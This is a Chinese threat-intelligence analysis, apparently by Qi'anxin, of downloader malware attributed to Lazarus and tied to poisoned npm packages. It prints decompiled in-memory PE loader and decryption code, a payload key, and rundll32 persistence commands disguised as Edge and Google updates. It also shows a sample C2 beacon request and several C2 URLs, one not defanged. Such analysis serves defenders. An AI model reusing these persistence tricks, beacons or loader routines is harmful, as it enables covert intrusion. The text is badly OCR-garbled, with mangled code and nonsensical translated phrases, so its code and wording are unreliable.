@@ -1,0 +1,422 @@
+# 疑似Lazarus（APT-Q-1）涉及npm包供应链的攻击样本分析  
+
+原创威胁情报中心奇安信威胁情报中心2023-12-0810:52发表于四川  
+
+## I团伙背景  
+
+Lazarus疑似具有东北亚背景的APT 组织，奇安信内部跟踪编号APT-Q-1。该组织因2014年攻击索尼影业开始受到广泛关注，其攻击活动最早可追溯到2007年。Lazarus早期主要针对政府机构，以窃取敏感情报为目的，但自2014年后，开始以全球金融机构、虚拟货币交易场等为目标，进行以窃取敏感情报为目的的攻击活动。此外，该组织还针对安全研究人员展开攻击。最近，Lazarus 分区发起软件供应链攻击，点亮今年的3CX 供应链攻击事件被认为出自该组织之手。  
+
+## I事件概述  
+
+奇安信威胁情报中心近期发现了一个非常复杂的下载器样本，此类样本经过高层挖掘的PE文件加载，最终从C2服务器下载后续附件并执行。其中一个C2服务器IP地址不久前被披露[1]用于共同软件供应链攻击事件，攻击者通过伪装为与加密相关的npm包投递恶意软件。结合上述报告内容和下载器样本自身的信息，可以确认这些下载器恶意软件与此次事件包供应链攻击事件有关。  
+
+# Crypto-Themed npm Packages Found DeliveringStealthyMalware  
+
+  
+
+根据下载器和相关样本代码的特征，我们关联到Lazarus组织的历史攻击样本，加上Lazarus常用的供应链攻击手段，所以我们认为这次npm包投毒事件的背后攻击者很可能就是Lazarus。  
+
+## I详细分析  
+
+下载器样本基本信息如下：  
+
+<html><body><table><tr><td>MD5</td><td>d8a8cc25bf5ef5b96ff7a64f663cbd29</td></tr><tr><td>文件名称</td><td>sql.tmp</td></tr><tr><td>创建时间</td><td>2023-09-1215:49:34世界标准时间</td></tr><tr><td>文件类型</td><td>PEDLL，64位</td></tr><tr><td>大小</td><td>318.00KB（325632字节）</td></tr><tr><td>PDB路径</td><td>F:lworkspace\CBG\npmLoaderDll\x64\Release\npmLoaderDll.pdb</td></tr><tr><td>指令与指</td><td>hxxp://91.206.178.125/upload/upload.asp</td></tr></table></body></html>  
+
+<html><body><table><tr><td>MD5</td><td>46127a35b73b714a9c5c58aaa43cb51f</td></tr><tr><td>文件名称</td><td>sql.tmp</td></tr><tr><td>创建时间</td><td>2023-10-2409:35:01世界标准时间</td></tr><tr><td>文件类型</td><td>PEDLL，64位</td></tr><tr><td>大小</td><td>334.50KB（342528字节）</td></tr><tr><td>PDB路径</td><td></td></tr><tr><td>指令与指</td><td>hxxps://blockchain-newtech.com/download/download.asp</td></tr></table></body></html>  
+
+<html><body><table><tr><td>MD5 a6e7c231a699d4efe85080ce5fb36dfb</td><td></td></tr><tr><td>文件名称</td><td>预安装.db</td></tr><tr><td>创建时间</td><td>2023-11-2316:07:22世界标准时间</td></tr><tr><td>文件类型</td><td>PEDLL，64位</td></tr><tr><td>大小</td><td>386.00KB（395264字节）</td></tr><tr><td>PDB路径</td><td>D:lworkspace\CBG\Windows\Loader\npmLoaderDll\x64\Release\npmLoaderDl</td></tr><tr><td>指令与指</td><td>1.pdb hxxps://chaingrown.com/manage/manage.asp</td></tr></table></body></html>  
+
+样本均经过梯度加载过程，最终运行下载器主模块，下面以样本a6e7c231a699d4efe85080ce5fb36dfb为例进行分析。  
+
+  
+
+### 加载过程  
+
+#### 阶段1  
+
+preinstall.db的导出函数CalculateSumW从文件自身数据解密出后续，并内存加载。  
+
+  
+
+关键初始化流程如下。  
+
+do V6 = \*((_DWORD \*)v5 + 1); V7=\*((-DWORD\*)v5+2); v8 = \*((-DWORD \*)v5 + 3）; v9 =\*((_DWORD \*)v5+15); v10=v4 +\*(_DWORD \*)v5 +\*(（_DWORD\*)v5+9) +((v6 >> 3)^__R0R4__(v6，7) ^__ROL4__(v6，14)) +((\*((_DWORD \*)V5 +14)>> 10)^_ROL4_(\*((_DWORD \*)v5 +14), 13)^_ROL4__(\*((_DWORD \*)v5 + 14),15)); \*(（_DWORD\*)v5+16)=v10; v11=v6 +\*((_DWORD \*)v5 +10) +（(v7>>3） _ROR4__(v7，7）^ _ROL4__(V7,14)) +（(v9>>10）^ _ROL4__(v9,13) __ROL4__(V9,15)) +V4 +1; \*((_DWORD \*)v5+ 17)= V11; v12 =\*（（_DWORD\*)v5+4）; \*(（_DWORD\*)v5+18）=v7 +\*((_DWORD \*)v5+ 11) +((V8 >> 3) __ROR4__(v8, 7) ^、_ROL4_(V8, 14)) + ((v10 >> 10) __ROL4__(V10, 13) ^__ROL4__(V10, 15)) +v4 +2; v13 =\*(（_DWORD \*)v5+12) +（（v12>>3）^ ROR4 (v12，7）^ ROL4__(v12,14)) +（（v11>>10）^ _ROL4__(V11,13)_ROL4__(v11,15)); v5 +=2; v14 =v8+v13+v4+ 3; v4 += 4; \*((_DWORD \*)v5+15）=V14; 1   
+while (v4< 0xA00 );   
+v15=512i64;   
+V16 = a1-(_QWORD)v34;   
+v17 =v34;   
+V18 $=$ 512i64; do  
+
+解密过程如下，加密数据位于.data段的0x18000BED0位置，为原地址解密。  
+
+v1=g_embed_data_18000BED0;   
+v3 = 4i64 -(_QWORD)g_embed_data_18000BED0;   
+do V4=\*（_DWORD\*)（a1+θx2000）&0x3FF; V5=（（\*（_WORD\*）（a1+0x2000）&0x3FF)-3）&0x3FF; V6 = (\*(-WORD \*)(a1 + 0x2000) & 0x3FF) · 10) & 0x3FF; V7 = (\*(-WORD \*)(a1 + 0x2000) & 0x3FF) - 12) & 0x3FF; V8 =(（\*（WORD \*)(a1 +0x2000)&0x3FF) + 1)&Ox3FF; if （\*（_DWORD \*)(a1 +0x2000)>=0x400u ) { v9=\*（_DWORD\*)（a1+4\*v4+4096) +\*（_DWORD \*)（a1+4\*v6+4096) +\*(_DWORD\*)(a1 4i64 \*（(（unsigned-_int16)\*（_DWORD\*)（a1+4\*v8+4096)^（unsignedint16)\*（_DWORD\*)（a1 +4\*v5+4096))&0x3FF)) +（_ROL4-_（\*(DWORD\*)(a1+4\*V8+4096),9)^ROR4-_（\*（_DWORD\*)(a1+4\*V5+4096),10)); \*（_DWORD\*)（a1+4\*v4+4096）=v9; v10=\*（_DWORD\*)（a1+4i64\*（unsigned _int8)\*（_DWORD \*)（a1+4\*v7+4096)) + \*（-DWORD \*)(a1 +4164 \*（Unstgned-int8)BYTE1（\*(_DWORD \*)（a1 + 4 \*V7 + 4096)) +1024) +\*（-DWORD \*)(a1+4164 \*（unstgnedint8)BYTE2(\*（DWORD \*)（a1+4\*V7+4096))+2048) +\*（_DWORD \*)（a1+4i64\*（unsigned _int8)HIBYTE（\*(_DWORD\*)（a1+4\*v7+4096))+3072); else v9=\*（_DWORD \*)（a1+4\*v4) + \*(-DWORD \*)(a1 + 4 \*v6) + \*(-DWORD \*)(a1 +4i64 \*(((unsigned __int16)\*(_DWORD \*)(a1 + 4 \*v8)^(unsigned __int16)\*(_DWORD \*)(a1 + 4 \*v5)）&θx3FF) +4096) +(-ROL4-_(\*(DWORD \*)(a1 + 4 \* v8), 9) ^_ROR4_(\*(_DWORD \*)(a1 + 4 \* v5), 10); \*（_DWORD\*)（a1+4\*V4）=v9; v10=\*（_DWORD \*)（a1+4164\*（unsigned--int8)\*（_DWORD \*)（a1+4\*v7)+4096) + \*(-DWORD \*)(a1 + 4i64 \*(Unsigned int8)BYTE1(\*(_DWORD \*)(a1 + 4 \*V7)) + 5120) +\*（-DWORD \*)(a1+4164 \*（UnsLoned-int8)BYTE2（\*（DWORD \*)(a1+4 \*V7))+6144) +\*(_DWORD \*)(a1 +4i64 \*（unsigned _int8)HIBYTE(\*(_DWORD \*)(a1 +4\*v7))+7168); v11=v9^v10; v1+=2; V12=\*（_DWORD\*)（a1+θx2000)+1; \*（_DWORD \*)（a1 +0x2004)=v11; \*(-DWORD \*)(a1 + 0x2000) ${}={}$ v12’& 0x7FF;  
+
+获取解密的数据为PE文件数据，内存加载执行。  
+
+#  
+
+疑似Lazarus（APT-Q-1）涉及npm包供应链的攻击样本分析   
+37 if (g-embed_data_180e0BED0[0] != 0x5A4D )   
+38 goto LABEL_2;   
+39 if ( (unsigned’ __int64)(dword_18000BFoc + 0x108i64) $\blacktriangleright$ 0x55400)   
+40 {   
+41 SetLastError(OxDu);   
+42 return 0i64;   
+43   
+44 V5 = (IMAGE_NT_HEADERS \*)((char \*)g_embed_data_18000BED0 $\cdot$ dword_18000BFoc):// offset 0x3C   
+45 if(v5->Stgnature = Ox4550 |I v5->FileHeader.Machine $1=$ 0x8664 Il (v5->0ptionalHeader.SectionAlignment & 1) I= 0 )   
+46   
+47LABEL_2:   
+48 SetLastError(oxC1u);   
+49 return 0i64;   
+50   
+51 if (v5->FileHeader.NumberofSections ）   
+52   
+53 v6 $=$ (DWORD \*)((char \*)&v5->OptionalHeader.SizeOfUninitializedData + V5->FileHeader.Size0foptionalHeader);   
+54 v7=v5->FileHeader.NumberofSections;   
+55 d   
+56 {   
+57 v8 = v6[1];   
+58 tf (v8)   
+59 v9=v8+\*v6;   
+60 else   
+61 v9 = v5->0ptionalHeader.SectionAlignment + (unsigned __int64)\*v6;   
+62 if (v9>v1 )   
+63 v1 =v9;   
+64 V6 += 10;   
+65 .-v7;   
+66   
+67 while (v7 );   
+68   
+148 V23 $=$ (char \*)VtrtualAlloc((LPVoID)v11,v20,0x100ou, 4u）;   
+149 memmove(v23,g-embed-data_18000BED0, v5->0ptionalHeader.Size0fHeaders);   
+150 V24 $=$ (IMAGE_NT_HEADERS \*)&v23[dword_18000BF0C];   
+151 var_heap_men1->ptr_PeNtHeaderData=v24;   
+152 V24->OptLonalHeader.ImageBase =V11;   
+153 if (!(unsigned int)sub_18ooo1680(v5,var_heap_mem1) )// copy data of each sectton   
+154 gotoLABEL_30;   
+155 v25=var_heap_men1->ptr_PeNtHeaderData->OptionalHeader.ImageBase-v5->OptionalHeader.ImageBase;//relocation table   
+156 var_heap_mem1->field_24=Iv2511 sub_180001A20(var_heap_mem1,v25);   
+157 lf (!(unsigned int)sub_180o01AF0(var_heap_mem1) l1 !(unsigned int)sub_1800017Bo((-_int64 \*)var_heap_mem1) )// Lmport table   
+158 gotoLABEL_30;   
+159 V26 $=$ var_heap_mem1->ptr_AlloctedPeMem;   
+160 v27=var_heap_nen1->ptr_PeNtHeaderData->OptionalHeader.DataDirectory[9].VirtualAddress;// TLS   
+161 if ((-DWORD)V27 )   
+162 {   
+163 v28 = \*(void (-_fastcall \*\*\*)(--int64, --int64))(v27 + v26 + 24);   
+164 if（v28）   
+165   
+166 for（i=\*v28;i;++v28)   
+167   
+168 t(v26, 1164);   
+169 =v28[1];   
+170   
+171 了   
+172   
+173 v30 = var_heap_mem1->ptr_PeNtHeaderData->OpttonalHeader.AddressofEntryPoint;   
+174 if（(_DWORD)V30）   
+175   
+176 var_entrypoint $=$ (unsigned int(-_fastcall \*)(__int64,-_int64,-_int64))(v11 +v30);   
+177 if ( var_heap_mem1->bool_IsDll )   
+178 {   
+179 if （ !var_entrypoint(v11, 1t64, a1))   
+180   
+181 V21 =1114;   
+182 goto LABEL_29;   
+183   
+184 var_heap_mem1->bool_DllLoad=1;   
+185 result $=$ var_heap_mem1;   
+186   
+187 else   
+188   
+189 var_heap_mem1->ptr_LoadPeEntrypoint $=$ (__int64)var_entrypotnt;  
+
+### 第二阶段  
+
+内存加载的PE为DLL文件，主要功能在sub_180002440函数中实现。首先采用相同的解密方法，解密文件中内嵌的zip压缩包数据。  
+
+V1 $=$ (char \*)&g_embed_data_1800445D0;   
+v3 $\l=$ &g_embed_data_1800445D0;   
+do V4=\*（_DWORD\*)（a1+θx2000)&θx3FF; V5 = ((\*(_WORD\*)(a1 +0x2000)&0x3FF)- 3)&0x3FF; V6=（(\*（_WORD\*)（a1+θx2000)&0x3FF)-10）&0x3FF; v7 =((\*(WoRD \*)(a1 + θx2000) &0x3FF) -12)&0x3FF; V8=（(\*(WORD\*)（a1 +0x2000)&0x3FF)+1)&Ox3FF; if（\*(_DWORD \*)(a1 +0x2000) $>=$ 0x400u) { V9 = \*（_DWORD \*)（a1 + 4 \*V4 +4096) + \*(-DWORD \*)(a1 + 4 \* V6 + 4096) +\*(_DWORD \*)(a1 +4i64 \*(unsigned _int16)\*(_DWORD \*)(a1 + 4 \*v8 + 4096)^(unsigned --int16)\*(_DWORD \*)(a1 + 4 \* v5 + +(-_ROL4-_(\*(DWORD \*)(a1+ 4 \*V8+ 4096),9)^_ROR4__(\*(_DWORD \*)(a1 + 4 \*v5 +4096),10)); \*（_DWORD\*)（a1+4\*V4+4096)=v9; v10 = \*(-DWORD \*)(a1 + 4i64 \*(unsigned int8)\*(_DWORD \*)(a1 +4 \*v7 + 4096)) +\*（DWORD \*)（a1 +4i64 \*（unsigned int8)BYTE1（\*（_DWORD \*)（a1+4\*v7+4096))+1024) + \*(-DWoRD \*)(a1 + 4i64 \*（unsigned int8)BYTE2(\*(DWORD \*)(a1 + 4 \*V7+ 4096))+2048) +\*(_DWORD \*)(a1 + 4i64 \*(unsigned int8)HIBYTE(\*(_DWORD \*)(a1 +4\*V7 +4096))+3072); else  
+
+  
+
+zip压缩包里有一个PE文件，被释放到路径"%AppData%\\..\Roaming\\Microsoft\IconCache.db"。  
+
+SHGetSpecialFolderPathW(0i64, &pszPath, CSIDL_APPDATA, 1);   
+v9 $=$ 0i64;   
+do   
+{ v10 = \*(WCHAR \*)((char \*)&pszPath + v9); v9 += 2i64; \*(_WORD \*)&v32[v9 + 524] =v10;   
+while (v10 );   
+v11 $=$ -1i64;   
+V12 ${}={}$ &FileName;   
+do   
+{ if（Iv11） break; v13=\*v12++==0; --v11;   
+while (!v13 );   
+\*（_QWORD \*)(v12 1) $\l=$ 0x5C002E002E005Ci64;   
+\*（_QWORD\*)（V12 $^+$ 3) $=$ 0x6D0061006F0052i64;   
+\*（_QWORD \*)（v12 +73 $\l=$ 0x5C0067006E0069164;   
+\*(_QWORD \*)(v12 $^+$ 11) $=$ 0x7200630069004Di64;   
+\*（_QWORD \*)（v12 $^+$ 15) $\l=$ 0x66006F0073006Fi64;   
+\*(_QWORD \*)(v12 $^+$ 19) $=$ 0x630049005c0074i64;   
+\*（_QWORD \*)（V12+23) $\l=$ 0x610043006E006Fi64;   
+\*(-QWORD \*)(v12 + 27) $=$ 0x2E006500680063164;   
+\*(DWORD \*)(V12 + 31) ${}={}$ 0X620064; //'\\..\\Roaming\\Microsoft\\IconCache.db'   
+V12[33] $=\Theta;$   
+v14 ${}={}$ CreateFileW(&FileName，@x4000000ou,0, 0i64,2u,0x8ou,0i64);   
+v3 =v14;   
+if (v14 $\!=$ (HANDLE)-1i64 && WriteFile(v14, v2,v27[138],&Number0fBytesWritten, 0i64） )// zip中的PE娄据 LocalFree(v2); CloseHandle(V3); V15 $=$ 0i64; do  
+
+另一段内嵌数据释放到路径"%AppData%\.\Roaming\\Microsoft\Network\NTUSER.DAT"。  
+
+疑似Lazarus（APT-Q-1）涉及npm包供应链的攻击样本分析  
+
+v19=L"\\..\\Roaming\\Microsoft\INetwork\\NTUSER.DAT";   
+do   
+{ if（!v17） break; v13=\*v18++==0; --V17;   
+while（!v13）;   
+v20 $\l=$ 41i64;   
+v21=v18:1;   
+while (v20 )   
+{ \*v21++= \*v19++; --v20;   
+v22=CreateFileW(&v29,0x120116u,1u,0i64,2u,θx8ou,0t64);//"\1..\\Roaming\\Microsoft\\Network\\NTUSER.DAT"   
+v23=v22;   
+(V22==(HANDLE)-1164) returnOxFFFFFFFFi64;   
+WriteFile(v22,&g_embed_data_180021FD0,0x22600u，0i64,0i64);   
+CloseHandle(v23)-  
+
+各方建立持久化，逐步尝试采用任务、作物、启动目录计划的明确方式。  
+
+(1）计划任务通过COM接口创建名为"MicrosoftEdgeUpdate"的计划任务，执行命令如下。  
+
+RUNDLL32.exe %APPDATA%\.\Roaming\Microsoft\ IconCache.db, GetProcFunc %APPD ATA%\..\Roaming\Microsoft\Network\ NTUSER.DAT 8888  
+
+  
+
+(2)开花  
+
+如果计划任务创建不成功，则在"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"下添加名为"GoogleUpdate"的键值，设置的执行命令如下。  
+
+cmd /c start /b rundll32 %APPDATA%\..\Roaming\Microsoft\ IconCache.db,GetProcFunc %A PPDATA%\..\Roaming\Microsoft\Network\ NTUSER.DAT 8888  
+
+  
+
+(3)启动目录  
+
+如果底部键值也未能成功设置，则在启动目录下释放文件，把文件属性设置为系统，隐藏文件路径为"C:\Users\\[user]\\AppData\\Roaming\\Microsoft\Windows\\开始菜单\程序\\Startup\\check.cmd"  
+
+  
+
+### 第三阶段  
+
+IconCache.db有两个导出函数，其中GetProcFunc为空，GetProcFuncW实现有效功[2]能。由于rundll32调用函数的特性，当格式化宽字符串参数时，对GetProcFunc的调用实际会执行GetProcFuncW函数。  
+
+  
+
+GetProcFuncW函数从作为参数的NTUSER.DAT文件中解密得到PE数据，然后内存加载，再调用其导出函数GetWindowSizedW。  
+
+  
+
+#### 下载器主模块  
+
+从NTUSER.DAT解密得到的PE文件为下载器主，先从C&C服务器获取附加适配器的基本信息，再根据这些信息下载附加适配器并执行模块。  
+
+首先选择作为C＆C服务器的URL，3组URL字符串实际为同一个。  
+
+  
+
+向C&C服务器发送的POST请求数据有7对参数，参数名均是随机生成的字符串，而参数的值分别含义如下。  
+
+<html><body><table><tr><td>参数序号 说明</td><td></td></tr><tr><td></td><td>以下载器操作指令（见下面）的值为随机字符串的长度</td></tr><tr><td>2</td><td>感染设备ID字符串的base64编码感染设备ID由三部分组成：构成IconCache.db的 参数（8888"），字符串“64”，以及随机字符，最终构成16字节长度的字符串</td></tr><tr><td>3</td><td>某段数据的base64编码，具体作用暂时未知</td></tr><tr><td>4</td><td>和操作指令相关的数字值</td></tr><tr><td>5</td><td>参数6对应字符串的长度</td></tr><tr><td>6</td><td>和操作指令相关的字符串base64编码，包含提供给C&C服务器的信息</td></tr><tr><td>7</td><td>随机字符串，用于混乱</td></tr></table></body></html>  
+
+#### 发送的请求数据示例如下。  
+
+POST /manage/manage.aspHTTP/1.1 Content-Type: applicatton/x-www-form-urlencoded Connection: Keep-Alive User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; InfoPath.3) Host: chaingrown.com Content-Length: 137 Cache-Control:no-cache   
+8   
+9   
+10 NF=DDAYSTWUBF&QGEDC=ODg40DY0OTFGMmlLOTY1ag==&ANQB=&QKKZOH=0&SREVGW=52& WDIGII=MgAwADIAMwAtADEAMgAtADAANwAgADEANQA6ADMANwA6ADIAOAA=&VOUI=HT  
+
+下载器的操作指令有以下几个。  
+
+<html><body><table><tr><td>参数序号</td><td>说明</td></tr><tr><td>0xA</td><td>开始请求附录，获取有效负载的基本信息</td></tr><tr><td>0x7</td><td>下载有效载荷</td></tr><tr><td>0xB</td><td>报告错误信息</td></tr><tr><td>0xC</td><td>执行payload</td></tr><tr><td>0xD</td><td>结束程序</td></tr></table></body></html>  
+
+下载器向C&C服务器请求后续阶段时，C&C服务器回复的关于payload的基本信息包括：payload编号、长度、执行的导出函数名、初始化的参数以及校验MD5值。在请求后续阶段，C&C服务器同时下发指令结束下载器程序。  
+
+do while（1 // request info loop while（ 1) var_res $=$ MwRequestPayloadInfo(var_urlStr);//请求payLoad,获取相关信息 if ( !var_res) // result $\scriptstyle==\varnothing$ ，sleep goto LABEL_28; if ( var_res != 1 break; //result $\scriptstyle==1$ ，continue the loop Sleep(10000u); if （var_res == 2 // result $==2$ ,successfully get info break; if （var_res $\L=\L=\L~-1$ //result $\L=\L=\L~-1$ ，exit memset(&v32[1], 0, 0x103ui64); Src $=\Theta$ memset(v36,0, sizeof(v36)); $v37~=~\Theta$  
+
+成功获取payload信息后，下载器利用payload编号向C&C服务器获取相应的发票数据，计算下载数据的MD5哈希，与之前获取的校验值进行比较。如果校验不通过则向C&C服务器报告'Hash错误！。  
+
+v1 = g_datalen; $\boldsymbol{\mathsf{v}}2\mathbf{\mathsf{\Omega}}=\mathbf{\mathsf{\Omega}}$ (const BYTE \*)g_hMem; pdwDataLen $\l=$ 16; v4 $\l=$ (char \*)malloc(500ui64); memset(v4, 0, 0x1F4ut64); if ( !CryptAcquirecontextW(&phProv, Oi64, L"Microsoft Base Cryptographic Provider v1.0", 1u, OxFoooooo0) ) v5=GetLastError（）; printf("CryptAcquirecontext failed: %d\n", v5); \*a1 ${}={}$ v5; return 0i64; if （!CryptCreateHash(phProv，CALG_MD5，0i64，θ，&phHash）) $\scriptstyle{\mathrm{~v}}7=$ GetLastError(); printf("CryptCreateHash failed: %d\n", v7); CryptReleaseContext(phProv, 0); \*a1 $\l=$ v7; return 0i64; if （!CryptHashData(phHash，v2，v1，θ）) v8 $=$ GetLastError(); v9 $=$ "CryptHashData failed: %d\n"; LABEL_7: V10 $=$ v8; printf(v9, v8); CryptReleaseContext(phProv,θ); CryptDestroyHash(phHash); \*a1 $=$ v10; return 0i64; if !CryptGetHashParam(phHash,2u, pbData,&pdwDataLen,0）) v8 ${}={}$ GetLastError(); v9 ${}={}$ "CryptGetHashParam failed: %d\n"; goto LABEL_7; if pdwDataLen）  
+
+memset(v72, 0, sizeof(v72));   
+$\yen45=$ MwGetPayloadMd5Hex((DWORD \*)&Size); !/计算获取的payLoad的MD5hash，并将其转换为十六进制字符串   
+MultiByteTowideChar(0,1u,v45,-1, &WideCharStr,strlen(v45));   
+v46 $\l=$ g_payloadHash;   
+do   
+{ V47 ${}={}$ \*(wchar_t_\*)((char \*)v46 + (char \*)&WideCharStr -(char \*)g_payloadHash); V48 $=$ \*v46 - v47; if（v48) break; ++v46;   
+while (v47 ); // this loop check hash   
+if( !v48 return 2; //ret value 2:valid data   
+v68[0] $=1$ 0；   
+memset(&v68[1],0, 0x206ui64);   
+V49 $=$ 0i64;   
+do v50 $=$ \*(_WORD \*)(v49 $^+$ 0x18001DE28i64); $11$ Ox18001DE28, string 'Hash error!' V49 $+=$ 2i64; \*(_WORD \*)&v67[v49+0x10D] $=$ v50;   
+while ( v50 );   
+MwReportError(var_urlStr,(__int64)v68);   
+if ( g_hMem ) LocalFree(g_hMem); g_hMem $\l=$ 0i64; return 0i64;  
+
+在执行payload阶段，先用和下载器加载过程相同的解密算法对payload解密。检查解密后的数据是否为PE文件，内存加载，然后找到指定恢复函数的内存地址，并确定参数执行。  
+
+strcpy((char \*)var_decryptKey, "LnvC.mh8/t/a5}!Cq?d%SA_j#<6Ua^\$="); $v82=\Theta$ memset(v83, 0,sizeof(v83)); V3 $=$ -1i64; V4 $=$ g_exportFuncName; do { if（!v3) break; v61 = \*v4++ == 0; -V3; while ( !v61 ); LODWORD(Size)=-1; WideCharToMultiByte(0, 0x20ou, g_exportFuncName, -1, &MultiByteStr, -(int)v3 - 2, 0i64, 0i64); sub_180001180((--int64)&v84, var_decryptKey, (int \*)var_decryptKey);// init key sub_1800013E0((--int64)&v84, g_dataLen); I/ decrypt payload v5 = sub_180006D50(); if（!v13->NumberofNamesIl !v13->NumberofFunctions) {   
+LABEL_21: v9=（int \*)hMem; goto LABEL_22; V14 = 0; V15 $=$ (unsigned int \*)(v11 $^+$ v13->AddressofNames); V16 ${}={}$ （unsigned_int16 \*)(v11 $^{+}$ v13->AddressofNameordinals); while（stricmp（&MultiByteStr,（const char \*)(v11 $^+$ \*v15))) ++v14; ++v15; ++v16; if (v14 $>=$ v13->NumberOfNames ) goto LABEL_20; V18=\*v16; if((unsigned int)v18 $>$ v13->NumberofFunctions 1i(var_funcAddr $\l=$ (__int64（__fastcall\*)(_QWORD，_QWORD，wchar_t\*，_QWORD))(v11 +\*(unsignedint \*)(v11 $^+$ v13->Address   
+LABEL_20: var_urlStr=\*(const WCHAR\*\*）&v78[1]; goto LABEL_21; 了 V20 $=$ (HLocAL)var_funcAddr(@i64,0i64,9_funcArg,@i64); Sleep(2000u);  
+
+## I溯源关联  
+
+样本d8a8cc25bf5ef5b96ff7a64f663cbd29的C&C服务器IP地址91[.]206.178.125于[1]今年11月发布的一篇关于npm包投毒的分析报告中提到。  
+
+The actor went through several iterations of development in the dev-config repo making modest changes until this early prototype was completed and published on 14 Sep 2023 under the name dot-environment v.1.1.0. Most notably, the resource that the malware called out to was found at hxxp: //91.206.178.125/files/npm.mov a Polish IP address.  
+
+  
+
+安全研究人员也发现了下载器样本46127a35b73b714a9c5c58aaa43cb51f出现在这次攻击活动中，但报告发布时他们将分析该样本。样本的名称sql.tmp和preinstall.db，以及在恶意脚本中导出函数名CalculateSum均出现。  
+
+  
+
+Now that they're done executing the PowerShell script, it's immediately deleted to clean up the trace of its existence. Then a check is performed to see if a file called preinstall.db already exists, and if so, it's deleted. Then the decrypted file from earlier is renamed to preinstall.db . Then the native Windows command rundll32 is used to execute a function calculatesum within the preinstall.db file passing the argument 4096. This means that the file we pulled from the IP (with a .mov extension and saved locally with a .a extension), decrypted, and then renamed with a .db extension is  
+
+另外，下载器样本的PDB路径npmLoaderDll.pdb也表明与此次npm包投毒事件有关。  
+
+### 关联样本  
+
+根据上述下载器样本中出现的字符串信息，我们关联到一个木马样本。  
+
+<html><body><table><tr><td>MD5</td><td>1c4227bf06121fe9c454a85ad9245b56</td></tr><tr><td>文件名称</td><td>TDLL.dli</td></tr><tr><td>创建时间</td><td>2023-08-0109:49:31世界标准时间</td></tr><tr><td>文件类型</td><td>PEDLL，64位</td></tr><tr><td>大小</td><td>747.00KB 3（764928字节）</td></tr></table></body></html>  
+
+S' .rdata:00000001..00000018 C (16.. %d|%d|%l64u .rdata:00000001..0000000E C (16... %s|%d)   
+'s' .rdata:00000001...0000000E C (16...  %s|x86 .rdata:00000001...0000000E C (16...  %s|x64 .rdata:00000001.. 0000000C C (16... %s|%d   
+'S .rdata:00000001..00000028 C (16... Hibernating Success .rdata:00000001...0000000E C (16. %s|%s] .rdata:00000001..00000024 C (16... %d-%d-%d %d:%d:%d   
+'s" .rdata:00000001..00000010 C (16... Unknown .rdata:00000001.. 00000012 C (16... %s|%s|%d   
+'s' .rdata:00000001...00000022 C(16... Sleeping Success   
+'S .rdata:00000001...00000034 C (16... TestConnection Successed! .rdata:00000001..0000002E C (16... TestConnection Failed!   
+'s' .rdata:00000001...00000022 C (16... Parameter Error! .rdata:00000001..0000002C C (16... GetProcAddress Error! .rdata:00000001...00000020 C (16... Dll Data Error!   
+'S .rdata:00000001..00000028 C (16... Dll Bits Incorrect! .rdata:00000001...00000018 C (16... Hash Error!   
+'s' .rdata:00000001..00000010 C 549821974578436   
+'s" .rdata:00000001..00000040 C (16.. http://156.236.76.9/faq/faq.asp .rdata:00000001..00000016 C (16... ServiceDll .rdata:00000001...00000022 C (16.. %s\\%s\\Parameters .rdata:00000001...00000032 C (16... %staskkill /f /PID %d \r\n  
+
+该木马样本的C&C服务器为hxxp://156.236.76.9/faq/faq.asp。除此之外，样本中还出现了下载器恶意软件加密使用的解密算法。  
+
+  
+
+### 归属  
+
+下载器内存加载PE的方式与阿联酋Lazarus攻击安全研究人员所使用的ComebackerDL[3]L样本一致。  
+
+Lf ( Src->e_magtc I= 0x5A4D ) return 0t64;   
+V3 $\Bumpeq$ (IMAGE_NT_HEADERS \*)((char \*)SrC $^+$ Src->e_lfanew);   
+tf ( v3->Signature $1=$ 0x4550) return 0i64;   
+$\vee4=$ (struct_LoadAux2 \*)VirtualAlloc( (LPVOID)v3->OptionalHeader ImageBase, x0ptonalHeader SzefImage, 0x2000u, 4u);   
+if(v4 'li(result $=$ (struct LoadAux2 \*)VirtualAlloc(@i64, v3->OptionalHeader.Size0fImage, Ox200ou, 4u), (v4 $\l=$ result)!=0i64））   
+( v5 = CetprocessHeap(); v6 = (struct_LoadAux2 \*)HeapAlloc(v5, 0, Ox2@ui64); V7 = v6; if (!v6) { sub_180001c80(v4); SetLastEror(OxEu); return 0t64; v6->tr-AlloctedpeMen $=$ (--int64)v4; v6->field_10 0i64; \*(_QWORD \*)&v6->field_18 ${}={}$ 0i64; VirtualAlloc(v4, v3->0ptionalHeader.SizeofImage, Ox100ou, 4u); v8 ${}={}$ (char\*)VrtualALloc(v4,V3->Optionaleader.Stzefeaders,Ox100ou,4u); memve(v,rcrfan+vOptonaeaderSzfader）; v9 (IMAGENTHEADERS)&v8[SrC->faneW]; V7->ptr_PeNtHeaderData=V9: v9->OptionalHeader.ImageBase $=$ (ULONGLONG)V4; sub_180001690(Src, v3,v7); l/ copy data of each section f (v4=(struct LoadAux2 \*)v3->OptionalHeaderImageBase)se sub_180001890(v7.(--int64)v4-v3->0ptionalHeader ImageBase);// relocatton table if ((unsigned int)sub_180001946(v7) ) //import table sub_180001780(v7); ftHeaderata>ptioalHeader.AddresofEntyPont; return v7; yar entryeotnt $=$ ttrtL\*taLdAx2\*, -nt64)arentynt(V4, 164) ) v7->bool_DllLoad $=1.$ return v7; IconCache.db sub-1800180(V7); MD5:7298b1f10ee6afab5e8bf648be1ca13b return 0i64;   
+if(\*(_WORD \*)Src != θx5A4D )   
+)(char s)sc+\*(nt \*)Src + 15);   
+tf(\*(DWORD\*)VS $1=$ x4550 )   
+return 0i64;   
+V6 =(char \*)VirtualAlloc(v5[6], \*((unsigned int \*)v5 + 20), 0x200ou, 4u);   
+if ( v6 ll (result $=$ (char \*)VirtuaLAlloc(0i64, \*(unsigned int \*)v5 + 26), 0x200ou, 4u), (v6 $=$ result) $!=$ θi64）） v7 = GetProcessHeap(); v8 = HeaALLoc(V7, , x2Oui64); v8[1] $=$ V6:4 v8[2]=0i64;   
